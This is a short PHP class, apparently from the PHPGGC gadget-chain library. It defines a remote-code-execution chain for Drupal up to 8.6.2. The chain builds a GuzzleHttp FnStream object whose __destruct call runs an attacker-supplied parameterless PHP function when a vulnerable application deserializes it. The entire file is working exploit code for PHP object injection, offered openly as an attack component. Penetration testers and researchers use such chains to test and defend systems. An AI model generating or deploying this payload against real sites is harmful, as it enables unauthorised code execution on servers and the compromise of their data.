<?php

namespace GadgetChain\Drupal;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '<= 8.6.2';
    public $vector = '__destruct';
    public $author = 'marcvelmer';
    public $informations = 'This chain expects a PHP function without parameters, such as phpinfo.';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        return new \GuzzleHttp\Psr7\FnStream(
            $code
        );
    }
}
